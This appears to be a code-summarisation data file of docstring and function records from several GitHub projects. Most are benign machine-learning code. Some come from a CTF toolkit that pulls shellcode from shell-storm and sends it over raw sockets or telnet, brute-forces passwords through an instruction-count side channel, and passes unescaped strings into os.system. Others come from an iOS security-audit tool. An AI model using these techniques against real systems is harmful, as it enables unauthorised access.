{"docstring": "\"\"\"\nI confess, I'm actually proud of this hack. I hope you enjoy!\nThis will generate a tensor with `n_shifts` of rotated versions the\nidentity matrix. When this tensor is multiplied by a vector\nthe result are `n_shifts` shifted versions of that vector. Since\neverything is done with inner products, everything is differentiable.\n\nParamters:\n----------\nleng: int > 0, number of memory locations\nn_shifts: int > 0, number of allowed shifts (if 1, no shift)\n\nReturns:\n--------\nshift operation, a tensor with dimensions (n_shifts, leng, leng)\n\"\"\"\n", "func_signal": "def _circulant(leng, n_shifts):\n", "code": "eye = np.eye(leng)\nshifts = range(n_shifts//2, -n_shifts//2, -1)\nC = np.asarray([np.roll(eye, s, axis=1) for s in shifts])\nreturn theano.shared(C.astype(theano.config.floatX))", "path": "seya\\layers\\ntm.py", "repo_name": "EderSantana/seya", "stars": 375, "license": "other", "language": "python", "size": 49839}
{"docstring": "\"\"\"\nRun pin with the specified command\n\"\"\"\n\n", "func_signal": "def run_pin(self, string):\n", "code": "if self.input_form == InputForm.ARGV:\n    cmd = '{0} {1} {2} {3}'.format(self.cmd, self.binary, self.binary_args, string)\n    os.system(cmd)\nelse:\n    cmd = '/bin/bash -c \"{0} {1} {2} <<< {3}\"'.format(self.cmd, self.binary, self.binary_args, string)\n    os.system(cmd)", "path": "v0ltlib\\tools\\inscounter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nClean temporary files\n\"\"\"\n", "func_signal": "def clean_temp(self):\n", "code": "tmp = [self.TMP_BRUTE, self.OUTPUT_FILE, 'pin.log']\n[ os.remove(f) for f in tmp if os.path.isfile(f) ]", "path": "v0ltlib\\tools\\inscounter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nFetch HTML page from shell-storm and recover the shellcode\n\"\"\"\n\n# Fetch webpage\n", "func_signal": "def html_to_shellcode(self, link):\n", "code": "html = urlopen(link).read()\n\n# Extract text\nsoup = BeautifulSoup(html, \"html.parser\")\nfor script in soup([\"script\", \"style\"]):\n    script.extract()\ntext = soup.get_text()\nlines = (line.strip() for line in text.splitlines())\nchunks = (phrase.strip() for line in lines for phrase in line.split(\"  \"))\ntext = '\\n'.join(chunk for chunk in chunks if chunk)\n\n# Extract shellcode\nshellcode = []\nfor i, line in enumerate(text.split(\"\\n\")):\n    if \"\\\"\\\\x\" in line:\n        line = self.delete_comments(line)\n        line = line[line.find(\"\\\"\\\\x\"):]\n        shellcode.append(line)\n\n# Clean Shellcode\nfinal_shellcode = ''.join(shellcode)\nfinal_shellcode = final_shellcode.replace(\"\\\"\", \"\")\nfinal_shellcode = final_shellcode.replace(\";\", \"\")\nfinal_shellcode = final_shellcode.replace(\" \", \"\")\nfinal_shellcode = final_shellcode.replace(\"\\t\", \"\")\nfinal_shellcode = final_shellcode.replace(\"\\n\", \"\")\nprint(\"{0} {1}\\n\".format(yellow(\"Shellcode:\"), final_shellcode))\n\n# In case there are multiple occurences of the shellcode in the page\nfinal_shellcode = self.principal_period(final_shellcode)\n\n# Return shellcode as string, not bytes\nself.shellcode = final_shellcode\nreturn self.shellcode", "path": "v0ltlib\\tools\\shellcrafter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nInitialize a netcat client\n\n:param hostname: Hostname to connect to\n:param port:     Port to connect to\n\"\"\"\n\n", "func_signal": "def __init__(self, hostname, port):\n", "code": "try:\n    self.tn = telnetlib.Telnet(hostname, port)\nexcept Exception as err:\n    fail(\"Could not connect Telnet to {0}:{1} (error: {2})\".format(hostname, port, err))\n    raise err\nprint(\"Connected to port {0}\".format(green(port)))", "path": "v0ltlib\\network\\telnet.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nGenerator that will yield each permutation, one at a time\n\n:returns: Strings\n\"\"\"\n", "func_signal": "def generate(self):\n", "code": "i = 0\nfor n in range(self.length, self.length + 1):\n\n    if i > self.max_iterations > 0:\n        break\n\n    for perm in itertools.product(self.dictionnary, repeat=n):\n        i += 1\n        if i > self.max_iterations > 0:\n            break\n        bruted = ''.join(perm)\n        bruted = self.begin_with + bruted[::-1] + self.end_with\n        yield bruted", "path": "v0ltlib\\tools\\bruteforce.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nDelete C style comments in shellcodes\n\"\"\"\n", "func_signal": "def delete_comments(line):\n", "code": "if \"//\" in line:\n    comment = line.find(\"//\")\n    line = line[:comment]\nif \"/*\" in line:\n    comment = line.find(\"/*\")\n    line = line[:comment]\nif \"*/\" in line:\n    comment = line.find(\"*/\")\n    line = line[:comment]\nreturn line", "path": "v0ltlib\\tools\\shellcrafter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nInitialize a netcat client\n\n:param hostname: Hostname to connect to\n:param port:     Port to connect to\n\"\"\"\n\n", "func_signal": "def __init__(self, hostname, port):\n", "code": "try:\n    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    self.socket.connect((hostname, port))\nexcept Exception as err:\n    fail(\"Could not connect Netcat to {0}:{1} (error: {2})\".format(hostname, port, err))\n    raise err\nprint(\"Connected to port {0}\".format(green(port)))", "path": "v0ltlib\\network\\netcat.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nRead until 'substring' is found\n\n:param substring: The string to look for\n:returns:         The received data\n\"\"\"\n\n", "func_signal": "def read_until(self, substring):\n", "code": "data = \"\\n\"\nwhile substring not in data:\n    data += bytes_to_str(self.socket.recv(4096))\nreturn data", "path": "v0ltlib\\network\\netcat.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nSend a shellcode from the ShellCrafter\n\"\"\"\n\n", "func_signal": "def shellcat(self, shellcode):\n", "code": "shellcode = shellcode.replace(\"\\\\x\", \"\")\nself.socket.send(bytearray.fromhex(shellcode))", "path": "v0ltlib\\network\\netcat.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nCounter that will try to determine the password accurately by\nbruteforcing every char with the complete charset\n\"\"\"\n\n", "func_signal": "def Accurate(self):\n", "code": "if self.length < 0:\n    warning(\"no length specified - guessing\")\n    self.length = self.get_pass_length()\n    if self.length < 0:\n        return None\n\nbegin_with = ''\nfor i in range(0, self.length):\n\n    # The character is one of the known ones\n    if self.fixed_chars[i] != '`':\n        begin_with = begin_with + self.fixed_chars[i]\n        success(\"char fixed:   {0} -> {1}\".format(self.fixed_chars[i],\n            begin_with))\n        continue\n\n    bf = Bruteforce(self.charset,\n                    final_length=self.length,\n                    begin_with=begin_with,\n                    max_iterations=len(self.charset))\n\n    last = -1\n    diff = 0\n    max_c = -1\n    for bruted in bf.generate():\n        self.clean_temp()\n        self.run_pin(bruted)\n\n        with open(self.OUTPUT_FILE, \"r\") as f:\n            count = f.read()\n            count = count[len(self.PIN_STRING_BEGIN):]\n            count = int(count)\n            debug('testing {0} ({1} - max diff: {2})'.format(\n                bruted.rstrip(),\n                count,\n                diff))\n            if last < 0:\n                last = count\n            else:\n                if self.stop_at == StopAt.FIRST_CHANGE:\n                    if count != last:\n                        max_c = bruted[i]\n                        debug(\"! New max\")\n                        break\n                else:\n                    if abs(count - last) > diff:\n                        max_c = bruted[i]\n                        diff = abs(count - last)\n                        debug(\"! New max\")\n\n    begin_with = begin_with + max_c\n    success(\"char guessed: {0} -> {1}\".format(max_c, begin_with))\n\nsuccess(\"pass found: {0}\".format(begin_with))\nreturn begin_with", "path": "v0ltlib\\tools\\inscounter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nUsed to pad the shellcode to the length specified in the constructor\n\"\"\"\n", "func_signal": "def padding(self):\n", "code": "pad_length = self.maximum_shellcode_length - self.shellcode_length()\nreturn \"\\\\x41\" * pad_length", "path": "v0ltlib\\tools\\shellcrafter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nSend a shellcode from the ShellCrafter\n\"\"\"\n\n", "func_signal": "def shellnet(self, shellcode):\n", "code": "shellcode = shellcode.replace(\"\\\\x\", \"\")\nself.tn.write(bytearray.fromhex(shellcode))", "path": "v0ltlib\\network\\telnet.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\n    Exchange with the server\n    Sends 'commands' and waits for 'nb_of_recv' messages back\n\n    :param command:    message to send\n    :param nb_of_recv: Number of messages to try to read\n    :returns:          The received data\n    \"\"\"\n\n", "func_signal": "def dialogue(self, command, nb_of_recv=1):\n", "code": "self.writeln(command)\nreturn \"{0}: {1}\".format(yellow(\"Answer\"), self.read(nb_of_recv))", "path": "v0ltlib\\network\\telnet.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nPrint shellcodes in database that match given keywords\nVERY HACKY - Didn't find any clean way to parse this, and I FREAKIN HATE\nparsing. So let's just hope the API won't change\n\"\"\"\n\n", "func_signal": "def handle_shelllist(self, response_text):\n", "code": "response_text_list = [x for x in response_text.split(\"\\n\") if x]\nshellist = []\nprint(\"\\n\")\n\nif len(response_text_list) < 1:\n    fail(\"No shellcode found for these parameters.\")\n    return None\n\n# Please do NOT change the API...\ni = 0\nfor line in response_text_list:\n\n    # Check shellcode length (strict=True)\n    if self.strict:\n        try:\n            length = re.search('\\d[\\d ]*bytes', line).group()\n            length = re.search('\\d*', length).group()\n            if int(length) > self.maximum_shellcode_length:\n                continue\n        except Exception as e:\n            # Shellcode has no length - Skip it\n            continue\n\n    # Get shellcode architecture\n    architecture = line[line.find(\"::::\") + 4:find_nth(line, \"::::\", 1)]\n\n    # Get shellcode's name\n    title = line[find_nth(line, \"::::\", 1) + 4:find_nth(line, \"::::\", 2)]\n\n    # Get shellcode's link\n    link = re.search('http://.*\\.php', line).group()\n\n    # Add to list\n    entry = \"({0}) {1}\".format(architecture, cyan(title))\n    shellist.append(link)\n    print(\"{0}: {1}\".format(i, entry))\n    i += 1\n\nif self.script_index > -1:\n    try:\n        sh = shellist[self.script_index]\n        return sh\n    except IndexError as e:\n        print(e)\n\nuser_choice = 0\nwhile 1:\n    user_choice = input(yellow(\"Selection: \"))\n    if int(user_choice) < 0:\n        continue\n    try:\n        print(\"Your choice: {0}\".format(shellist[int(user_choice)]))\n        break\n    except IndexError as e:\n        print(e)\n        continue\n\n# Return selected shellcode\nreturn shellist[int(user_choice)]", "path": "v0ltlib\\tools\\shellcrafter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "# If ofset == 0, bruteforce all possibilities\n\n", "func_signal": "def basic_ceasar(string, offset=0):\n", "code": "string = string.upper()\nalphabet = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')\nupper_bound = len(alphabet)\n\nif offset != 0:\n    encrypted = ''\n\n    for c in string:\n        if c == \" \":\n            encrypted += \" \"\n        else:\n            if c in alphabet:\n                encrypted += alphabet[(alphabet.index(c) + offset) % upper_bound]\n    return encrypted\n\nelse:\n    for i in range(upper_bound, 0, -1):\n        plaintext = ''\n\n        for c in string:\n            if c == \" \":\n                plaintext += \" \"\n            else:\n                if c in alphabet:\n                    plaintext += alphabet[(alphabet.index(c) + i) % upper_bound]\n        print(\"{0}: {1}\".format(upper_bound - i, plaintext))", "path": "v0ltlib\\utils\\crypto_utils.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nGenerate strings for printing to screen or to a file\n\n:param output:  If set, name of the file to write the permutations to\n:param verbose: Display or not the classical warning messages\n\"\"\"\n", "func_signal": "def generate_strings(self, output=None, verbose=True):\n", "code": "nb_of_lines = pow(len(self.dictionnary), self.length)\nif self.max_iterations == -1:\n    self.max_iterations = nb_of_lines + 1\n\nif output:\n\n    f = open(output, \"w\")\n\n    if verbose:\n        approx_size = sizeof_fmt((self.final_length + 1) * nb_of_lines, rounded=True)\n        warning(\"This may generate a very large file\")\n        print(\"({0} permutations here == more than {1})\".format(nb_of_lines, approx_size))\n        debug(\"Bruteforcing...\")\n    for bruted in self.generate():\n        f.write(bruted)\n\n    f.close()\n    success(\"Bruted file created ({0})\".format(sizeof_fmt(os.path.getsize(output))))\n\nelse:\n    if verbose:\n        warning(\"This may generate a very large output\")\n        print(\"({0} permutations here)\".format(nb_of_lines))\n\n    for bruted in self.generate():\n        print(bruted)", "path": "v0ltlib\\tools\\bruteforce.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nDetermine the password's length\n\n:returns: The guessed length\n\"\"\"\n\n", "func_signal": "def get_pass_length(self):\n", "code": "last = -1\ndiff = 0\nmax_i = -1\n\nfor i in range(2, 100):\n\n    string = 'A' * i\n    self.run_pin(string)\n\n    try:\n        with open(self.OUTPUT_FILE, 'r') as f:\n            count = f.read()[len(self.PIN_STRING_BEGIN):]\n            count = int(count)\n            if last < 0:\n                last = count\n                diff = 0\n            else:\n                if count - last > diff:\n                    if self.stop_at == StopAt.FIRST_CHANGE:\n                        success('Pass length guessed: {0}'.format(i))\n                        return i\n                    diff = count - last\n                    max_i = i\n                    debug(\"! New max\")\n                last = count\n            debug(\"Length {0}: {1} (max diff: {2})\".format(i, count, diff))\n    except Exception as e:\n        smth_went_wrong('get_pass_length', e)\n        return -1\n\nsuccess('Pass length guessed: {0}'.format(max_i))\nself.clean_temp()\nreturn max_i + 1", "path": "v0ltlib\\tools\\inscounter.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nRead from the server\n:param nb_of_recv: Number of message to try to receive\n:returns:    The received data\n\"\"\"\n\n", "func_signal": "def read(self, nb_of_recv=1):\n", "code": "data = \"\\n\"\nfor x in range(0, nb_of_recv):\n    data += bytes_to_str(self.socket.recv(4096))\nreturn data", "path": "v0ltlib\\network\\netcat.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nExchange with the server\nSends 'commands' and waits for 'nb_of_recv' messages back\n\n:param command:    message to send\n:param nb_of_recv: Number of messages to try to read\n:returns:          The received data\n\"\"\"\n\n", "func_signal": "def dialogue(self, command, nb_of_recv=1):\n", "code": "self.writeln(command)\nreturn \"{0}: {1}\".format(yellow(\"Answer\"), self.read(nb_of_recv))", "path": "v0ltlib\\network\\netcat.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\nRead from the server\n:param nb_of_recv: Number of message to try to receive\n:returns:    The received data\n\"\"\"\n\n", "func_signal": "def read(self, nb_of_recv=1):\n", "code": "data = \"\\n\"\nfor x in range(0, nb_of_recv):\n    data += bytes_to_str(self.tn.read_some())\nreturn data", "path": "v0ltlib\\network\\telnet.py", "repo_name": "P1kachu/v0lt", "stars": 356, "license": "None", "language": "python", "size": 11801}
{"docstring": "\"\"\"\"\"\"\n", "func_signal": "def keychain_access_groups_by_bundle_id(self, bundle_id):\n", "code": "if self.dic.has_key(\"User\"):\n    if self.dic[\"User\"].has_key(bundle_id):\n        if self.dic[\"User\"][bundle_id].has_key(\"Entitlements\"):\n            if self.dic[\"User\"][bundle_id][\"Entitlements\"].has_key(\"keychain-access-groups\"):\n                return self.dic[\"User\"][bundle_id][\"Entitlements\"][\"keychain-access-groups\"]\nreturn \"\"", "path": "lib\\ios8ServicesMap.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Ask a yes/no question via raw_input() and return their answer.\n\n\"question\" is a string that is presented to the user.\n\"default\" is the presumed answer if the user just hits <Enter>.\n    It must be \"yes\" (the default), \"no\" or None (meaning\n    an answer is required of the user).\n\nThe \"answer\" return value is one of \"yes\" or \"no\".\n\"\"\"\n", "func_signal": "def query_yes_no(question, default=\"yes\"):\n", "code": "valid = {\"yes\":\"yes\",   \"y\":\"yes\",  \"ye\":\"yes\",\n         \"no\":\"no\",     \"n\":\"no\"}\nif default == None:\n    prompt = \" [y/n] \"\nelif default == \"yes\":\n    prompt = \" [Y/n] \"\nelif default == \"no\":\n    prompt = \" [y/N] \"\nelse:\n    raise ValueError(\"invalid default answer: '%s'\" % default)\n\nwhile 1:\n    sys.stdout.write(question + prompt)\n    choice = raw_input().lower()\n    if default is not None and choice == '':\n        return default\n    elif choice in valid.keys():\n        return valid[choice]\n    else:\n        sys.stdout.write(\"Please respond with 'yes' or 'no' \"\\\n                         \"(or 'y' or 'n').\\n\")", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"\"\"\"\n", "func_signal": "def all_strings(self):\n", "code": "cmd = \"strings {}\".format(self.local_path)\nreturn self.exec_shell(cmd)", "path": "lib\\appbinary.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"An iterator over the available IOS simulator versions\n\"\"\"\n", "func_signal": "def ios_simulators():\n", "code": "for sdk_dir in os.listdir(IOSSimulator.simulatorDir):\n    if not sdk_dir.startswith('.'):\n        simulator = IOSSimulator(sdk_dir)\n        if simulator.is_valid():\n            yield simulator", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Get the certificate subject in human readable one line format\n\"\"\"\n", "func_signal": "def get_subject(self):\n", "code": "if self._data != None:\n    # use openssl to extract the subject text in single line format\n    possl = subprocess.Popen(['openssl',  'x509', '-inform',  'DER',  '-noout',  '-subject', '-issuer', '-dates', '-nameopt', 'oneline'], \n        shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=None)\n    subjectText, error_text = possl.communicate(self.get_data())\n    return subjectText\nreturn None", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Read a tag from the input.\"\"\"\n", "func_signal": "def _read_tag(self):\n", "code": "byte = self._read_byte()\ncls = byte & 0xc0\ntyp = byte & 0x20\nnr = byte & 0x1f\nif nr == 0x1f:\n    nr = 0\n    while True:\n        byte = self._read_byte()\n        nr = (nr << 7) | (byte & 0x7f)\n        if not byte & 0x80:\n            break\nreturn (nr, typ, cls)", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Read a value from the input.\"\"\"\n", "func_signal": "def _read_value(self, nr, length):\n", "code": "bytes = self._read_bytes(length)\nvalue = bytes\nreturn value", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"\"\"\"\n", "func_signal": "def entitlements_by_bundle_id(self, bundle_id):\n", "code": "if self.dic.has_key(\"User\"):\n    if self.dic[\"User\"].has_key(bundle_id):\n        if self.dic[\"User\"][bundle_id].has_key(\"Entitlements\"):\n            return self.dic[\"User\"][bundle_id][\"Entitlements\"]\nreturn {}", "path": "lib\\ios8ServicesMap.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Constructor\"\"\"\n", "func_signal": "def __init__(self, path):\n", "code": "self.local_path = path\nself.otool = OtoolUtil(self.local_path)", "path": "lib\\appbinary.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Return True if we are at the end of input.\"\"\"\n", "func_signal": "def _end_of_input(self):\n", "code": "index, input = self.m_stack[-1]\nassert not index > len(input)\nreturn index == len(input)", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Constructor.\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.m_stack = None\nself.m_tag = None", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Emit raw bytes.\"\"\"\n", "func_signal": "def _emit(self, s):\n", "code": "assert isinstance(s, str)\nself.m_stack[-1].append(s)", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"\"\"\"\n", "func_signal": "def is_encrypt(self):\n", "code": "if (self.otool is not None) and (self.otool.load_cmds is not None):\n    for (k, v) in self.otool.load_cmds.items():\n        if v['cmd'].strip().startswith(\"LC_ENCRYPTION_INFO\") and v['cryptid'].strip() == str(1):\n            return True\n\nreturn False", "path": "lib\\appbinary.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"An iterator over the available device backups\n\"\"\"\n", "func_signal": "def device_backups():\n", "code": "base_backupdir = os.getenv('HOME') + \"/Library/Application Support/MobileSync/Backup/\"\nfor backup_dir in os.listdir(base_backupdir):\n    backup = DeviceBackup(base_backupdir + backup_dir)\n    if backup.is_valid():\n        yield backup", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"\"\"\"\n", "func_signal": "def data_dir_by_bundle_id(self, bundle_id):\n", "code": "if self.dic.has_key(\"User\"):\n    if self.dic[\"User\"].has_key(bundle_id):\n        if self.dic[\"User\"][bundle_id].has_key(\"Container\"):\n            return self.dic[\"User\"][bundle_id][\"Container\"]\nreturn \"\"", "path": "lib\\ios8ServicesMap.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "# trace = sys.stdout\n", "func_signal": "def _process_subject(self, input, output, indent=0):\n", "code": "while not input.eof():\n    tag = input.peek()\n    if tag[1] == ASN1.TypePrimitive:\n        tag, value = input.read()\n        if tag[0] == ASN1.PrintableString:\n            value = string.upper(value)\n        output.write(value, tag[0], tag[1], tag[2])\n        #trace.write(' ' * indent)\n        #trace.write('[%s] %s (value %s)' %\n        #         (strclass(tag[2]), strid(tag[0]), repr(value)))\n        #trace.write('\\n')\n    elif tag[1] == ASN1.TypeConstructed:\n        #trace.write(' ' * indent)\n        #trace.write('[%s] %s:\\n' % (strclass(tag[2]), strid(tag[0])))\n        input.enter()\n        output.enter(tag[0], tag[2])\n        self._process_subject(input, output, indent+2)\n        output.leave()\n        input.leave()", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Emit a short (< 31 bytes) tag.\"\"\"\n", "func_signal": "def _emit_tag_short(self, nr, typ, cls):\n", "code": "assert nr < 31\nself._emit(chr(nr | typ | cls))", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Emit the short length form (< 128 octets).\"\"\"\n", "func_signal": "def _emit_length_short(self, length):\n", "code": "assert length < 128\nself._emit(chr(length))", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Load a certificate from a file in PEM format\n\"\"\"\n", "func_signal": "def load_DERfile(self, certificate_path):\n", "code": "self._init_data()\nself._filepath = certificate_path\nwith open(self._filepath, \"r\") as inputFile:\n    PEMdata = inputFile.read()\n# convert to binary (DER format)\nself._data = PEMdata", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Save a certificate to a file in PEM format\n\"\"\"\n", "func_signal": "def save_PEMfile(self, certificate_path):\n", "code": "self._filepath = certificate_path\n# convert to text (PEM format)\nPEMdata = ssl.DER_cert_to_PEM_cert(self._data)\nwith open(self._filepath, \"w\") as output_file:\n    output_file.write(PEMdata)", "path": "lib\\iosCertTrustManager.py", "repo_name": "alibaba/iOSSecAudit", "stars": 260, "license": "gpl-3.0", "language": "python", "size": 1647}
{"docstring": "\"\"\"Constructs block-diagonal matrices from a list of batched 2D tensors.\nTaken from: https://stackoverflow.com/questions/42157781/block-diagonal-matrices-in-tensorflow\n\nArgs:\nmatrices: A list of Tensors with shape [..., N_i, M_i] (i.e. a list of\n  matrices with the same batch dimension).\ndtype: Data type to use. The Tensors in `matrices` must match this dtype.\nReturns:\nA matrix with the input matrices stacked along its main diagonal, having\nshape [..., \\sum_i N_i, \\sum_i M_i].\n\n\"\"\"\n", "func_signal": "def block_diagonal(matrices, dtype=tf.float32):\n", "code": "matrices = [tf.convert_to_tensor(matrix, dtype=dtype) for matrix in matrices]\nblocked_rows = tf.Dimension(0)\nblocked_cols = tf.Dimension(0)\nbatch_shape = tf.TensorShape(None)\nfor matrix in matrices:\n    full_matrix_shape = matrix.get_shape().with_rank_at_least(2)\n    batch_shape = batch_shape.merge_with(full_matrix_shape[:-2])\n    blocked_rows += full_matrix_shape[-2]\n    blocked_cols += full_matrix_shape[-1]\nret_columns_list = []\nfor matrix in matrices:\n    matrix_shape = tf.shape(matrix)\n    ret_columns_list.append(matrix_shape[-1])\nret_columns = tf.add_n(ret_columns_list)\nrow_blocks = []\ncurrent_column = 0\nfor matrix in matrices:\n    matrix_shape = tf.shape(matrix)\n    row_before_length = current_column\n    current_column += matrix_shape[-1]\n    row_after_length = ret_columns - current_column\n    row_blocks.append(tf.pad(\n        tensor=matrix,\n        paddings=tf.concat(\n            [tf.zeros([tf.rank(matrix) - 1, 2], dtype=tf.int32),\n             [(row_before_length, row_after_length)]],\n            axis=0)))\nblocked = tf.concat(row_blocks, -2)\nblocked.set_shape(batch_shape.concatenate((blocked_rows, blocked_cols)))\nreturn blocked", "path": "improved_wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Take an MNIST picture normalized into [0, 1] and transform\n    it according to the mode:\n    n   -   noise\n    i   -   colour invert\n    s*  -   shift\n\"\"\"\n", "func_signal": "def transform_mnist(pic, mode='n'):\n", "code": "pic = np.copy(pic)\nif mode == 'n':\n    noise = np.random.randn(28, 28, 1)\n    return np.clip(pic + 0.25 * noise, 0, 1)\nelif mode == 'i':\n    return 1. - pic\npixels = 3 + np.random.randint(5)\nif mode == 'sl':\n    pic[:, :-pixels] = pic[:, pixels:] + 0.0\n    pic[:, -pixels:] = 0.\nelif mode == 'sr':\n    pic[:, pixels:] = pic[:, :-pixels] + 0.0\n    pic[:, :pixels] = 0.\nelif mode == 'sd':\n    pic[pixels:, :] = pic[:-pixels, :] + 0.0\n    pic[:pixels, :] = 0.\nelif mode == 'su':\n    pic[:-pixels, :] = pic[pixels:, :] + 0.0\n    pic[-pixels:, :] = 0.\nreturn pic", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load CIFAR10\n\n\"\"\"\n", "func_signal": "def _load_cifar(self, opts):\n", "code": "logging.debug('Loading CIFAR10 dataset')\n\nnum_train_samples = 50000\ndata_dir = _data_dir(opts)\nx_train = np.zeros((num_train_samples, 3, 32, 32), dtype='uint8')\ny_train = np.zeros((num_train_samples,), dtype='uint8')\n\nfor i in range(1, 6):\n    fpath = os.path.join(data_dir, 'data_batch_' + str(i))\n    data, labels = load_cifar_batch(fpath)\n    x_train[(i - 1) * 10000: i * 10000, :, :, :] = data\n    y_train[(i - 1) * 10000: i * 10000] = labels\n\nfpath = os.path.join(data_dir, 'test_batch')\nx_test, y_test = load_cifar_batch(fpath)\n\ny_train = np.reshape(y_train, (len(y_train), 1))\ny_test = np.reshape(y_test, (len(y_test), 1))\nx_train = x_train.transpose(0, 2, 3, 1)\nx_test = x_test.transpose(0, 2, 3, 1)\n\nX = np.vstack([x_train, x_test])\nX = X/255.\ny = np.vstack([y_train, y_test])\n\nseed = 123\nnp.random.seed(seed)\nnp.random.shuffle(X)\nnp.random.seed(seed)\nnp.random.shuffle(y)\nnp.random.seed()\n\nself.data_shape = (32, 32, 3)\n\nself.data = Data(opts, X[:-1000])\nself.test_data = Data(opts, X[-1000:])\nself.labels = y[:-1000]\nself.test_labels = y[-1000:]\nself.num_points = len(self.data)\n\nlogging.debug('Loading Done.')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
